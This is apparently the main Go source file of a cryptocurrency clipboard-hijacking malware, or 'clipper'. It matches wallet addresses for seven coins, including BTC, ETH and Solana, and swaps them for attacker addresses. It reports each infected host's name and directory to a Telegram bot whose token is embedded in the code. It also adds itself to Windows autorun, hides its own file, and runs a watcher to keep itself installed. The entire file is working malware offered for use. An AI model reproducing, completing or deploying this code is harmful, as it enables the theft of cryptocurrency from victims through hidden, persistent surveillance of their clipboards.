package main

import (
	"fmt"
	"os"
	"regexp"

	"clipper/src/autorun"
	"clipper/src/clipper"
	"clipper/src/hide"
	"clipper/src/telegram"
	"clipper/src/utils"
)

var (
	btcRegex     = regexp.MustCompile(`^(?:bc1[ac-hj-np-z02-9]{25,90}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$`)
	ethRegex     = regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
	ltcRegex     = regexp.MustCompile(`^(?:ltc1[ac-hj-np-z02-9]{39,59}|[LM3][a-km-zA-HJ-NP-Z1-9]{26,34})$`)
	dogeRegex    = regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$`)
	tonRegex     = regexp.MustCompile(`^(?:EQ|UQ)[0-9A-Za-z_-]{46,48}$`)
	usdttrcRegex = regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`)
	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
)

/* *** change this *** */
var matchers = []clipper.Matcher{
	{Regex: btcRegex, Addr: "btc_clipped"},         // BTC
	{Regex: ethRegex, Addr: "eth_clipped"},         // ETH
	{Regex: ltcRegex, Addr: "ltc_clipped"},         // LTC
	{Regex: dogeRegex, Addr: "doge_clipped"},       // DOGE
	{Regex: tonRegex, Addr: "ton_clipped"},         // TON
	{Regex: usdttrcRegex, Addr: "usdttrc_clipped"}, // USDT TRC20
	{Regex: solRegex, Addr: "sol_clipped"},         // Solana
}

/* *** change this *** */
var (
	bot_token = "8544283395:AAGwBn1O27AyGnFA5XfKc9S7rdILbSkiq5s"
	chat_id   = "7336461438" // u can use group (starts with -100) or chat id
)

func main() {
	hostname, _ := os.Hostname()
	
	selfDir, _ := utils.GetSelfDir()
	selfName, _ := utils.GetSelfName()

	// send start log to telegram
	telegram.SendLog(fmt.Sprintf(
		"Connected - %s\n\nDir - %s",
		hostname,
		selfDir,
	), chat_id, bot_token)

	// we adding self to windows autorun
	_ = autorun.AddToAutorun(selfDir, selfName)

	_ = hide.HideFile(selfDir)

	// we starting main clipper process
	clipper.StartClipper(chat_id, bot_token, matchers)
	// we starting autorun watcher
	autorun.StartWatcher(selfDir, selfName)

	select {}
}
